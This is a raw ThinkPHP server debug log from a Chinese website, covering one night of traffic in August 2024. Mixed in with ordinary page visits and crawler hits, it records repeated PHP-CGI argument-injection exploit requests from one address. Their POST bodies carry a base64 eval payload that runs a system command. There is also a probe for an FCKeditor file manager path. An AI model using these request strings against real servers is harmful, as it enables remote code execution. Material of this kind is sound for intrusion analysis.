---------------------------------------------------------------
[ 2024-08-31T00:26:16+08:00 ] 14.215.163.132 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.575333s] [åžåçŽ‡ï¼š1.74req/s] [å†…å­˜æ¶ˆè€—ï¼š2,949.93kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://www.aosuper.com',
  'pragma' => 'no-cache',
  'connection' => 'close',
  'cache-control' => 'no-cache',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => 'www.aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.014352s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.055382s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '14.215.163.132' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.071551s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000499s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '14.215.163.132' [ RunTime:0.045124s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('14.215.163.132' , 2 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 00:26:15' , 8 , 'æ™®é€šç½‘å‹') [ RunTime:0.000521s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '14.215.163.132'  AND `ucookie` IS NULL [ RunTime:0.006878s ]
---------------------------------------------------------------
[ 2024-08-31T00:50:45+08:00 ] 141.98.83.239 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015616s] [åžåçŽ‡ï¼š64.04req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T00:50:46+08:00 ] 141.98.83.239 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.014807s] [åžåçŽ‡ï¼š67.54req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T02:44:19+08:00 ] 141.98.83.239 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.016569s] [åžåçŽ‡ï¼š60.35req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T02:44:21+08:00 ] 141.98.83.239 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015011s] [åžåçŽ‡ï¼š66.62req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T03:15:08+08:00 ] 212.227.216.117 GET aosuper.com/sitemap.xml
[è¿è¡Œæ—¶é—´ï¼š0.014542s] [åžåçŽ‡ï¼š68.77req/s] [å†…å­˜æ¶ˆè€—ï¼š1,334.30kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'IonCrawl (https://www.ionos.de/terms-gtc/faq-crawler-en/)',
  'connection' => 'keep-alive',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T03:15:09+08:00 ] 212.227.216.117 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.442456s] [åžåçŽ‡ï¼š2.26req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.15kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'IonCrawl (https://www.ionos.de/terms-gtc/faq-crawler-en/)',
  'connection' => 'keep-alive',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000712s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002881s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '212.227.216.117' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.206854s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000528s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '212.227.216.117' [ RunTime:0.006962s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('212.227.216.117' , 1 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 03:15:08' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000433s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '212.227.216.117'  AND `ucookie` IS NULL [ RunTime:0.006733s ]
---------------------------------------------------------------
[ 2024-08-31T03:24:02+08:00 ] 42.83.147.56 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.049349s] [åžåçŽ‡ï¼š20.26req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.63kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'content-type' => 'text/html; charset=utf-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'aosuper.com',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000701s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002646s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '42.83.147.56' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000643s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000327s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '42.83.147.56' [ RunTime:0.006912s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('42.83.147.56' , 2 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 03:24:02' , 30 , 'æ½œåœ¨ç”¨æˆ·') [ RunTime:0.000600s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '42.83.147.56'  AND `ucookie` IS NULL [ RunTime:0.006331s ]
---------------------------------------------------------------
[ 2024-08-31T03:24:02+08:00 ] 42.83.147.56 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.043133s] [åžåçŽ‡ï¼š23.18req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.50kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'content-type' => 'text/html; charset=utf-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'aosuper.com',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000578s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002740s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '42.83.147.56' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000471s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000324s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '42.83.147.56'  AND `ucookie` IS NULL [ RunTime:0.007128s ]
---------------------------------------------------------------
[ 2024-08-31T04:41:14+08:00 ] 141.98.83.239 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.182749s] [åžåçŽ‡ï¼š5.47req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T04:41:17+08:00 ] 141.98.83.239 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015692s] [åžåçŽ‡ï¼š63.73req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T06:26:07+08:00 ] 170.246.52.125 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š3.561632s] [åžåçŽ‡ï¼š0.28req/s] [å†…å­˜æ¶ˆè€—ï¼š2,951.10kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'priority' => 'u=0, i',
  'accept-encoding' => 'gzip, deflate, br, zstd',
  'sec-ch-ua-platform' => '"Linux"',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '"Chromium";v="128", "Not;A=Brand";v="24", "HeadlessChrome";v="128"',
  'sec-fetch-dest' => 'document',
  'sec-fetch-user' => '?1',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'none',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.84 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000771s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.010352s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '170.246.52.125' ORDER BY `Id` DESC LIMIT 1 [ RunTime:2.939677s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000631s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '170.246.52.125' [ RunTime:0.007699s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('170.246.52.125' , 1 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 06:26:03' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000582s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '170.246.52.125'  AND `ucookie` IS NULL [ RunTime:0.007247s ]
---------------------------------------------------------------
[ 2024-08-31T06:26:08+08:00 ] 170.246.52.125 GET aosuper.com/login.php/index/captcha
[è¿è¡Œæ—¶é—´ï¼š0.482374s] [åžåçŽ‡ï¼š2.07req/s] [å†…å­˜æ¶ˆè€—ï¼š11,511.33kb] [æ–‡ä»¶åŠ è½½ï¼š50]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ BIND ] 'admin'
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'captcha',
  ),
)
[ info ] [ HEADER ] array (
  'priority' => 'i',
  'accept-encoding' => 'gzip, deflate, br, zstd',
  'referer' => 'https://aosuper.com/',
  'sec-fetch-dest' => 'image',
  'sec-fetch-mode' => 'no-cors',
  'sec-fetch-site' => 'same-origin',
  'accept' => 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
  'sec-ch-ua-platform' => '"Linux"',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.84 Safari/537.36',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '"Not)A;Brand";v="99", "Google Chrome";v="128", "Chromium";v="128", sec-ch-ua-mobile=?0, sec-ch-ua-platform="Linux"',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\admin\controller\Index->captcha[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000695s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002566s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` IS NULL [ RunTime:0.019718s ]
---------------------------------------------------------------
[ 2024-08-31T06:29:31+08:00 ] 141.98.83.239 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015342s] [åžåçŽ‡ï¼š65.18req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T06:29:32+08:00 ] 141.98.83.239 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.014714s] [åžåçŽ‡ï¼š67.96req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T08:11:18+08:00 ] 141.98.83.239 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015778s] [åžåçŽ‡ï¼š63.38req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T08:11:20+08:00 ] 141.98.83.239 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.014826s] [åžåçŽ‡ï¼š67.45req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T08:50:07+08:00 ] 104.247.184.210 GET aosuper.com/cfide/scripts/ajax/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.015716s] [åžåçŽ‡ï¼š63.63req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.79kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cfide',
    1 => 'scripts',
    2 => 'ajax',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'fckeditor' => 'editor',
  'filemanager' => 'browser',
  'default' => 'browser',
)
[ info ] [ LOG ] INIT File
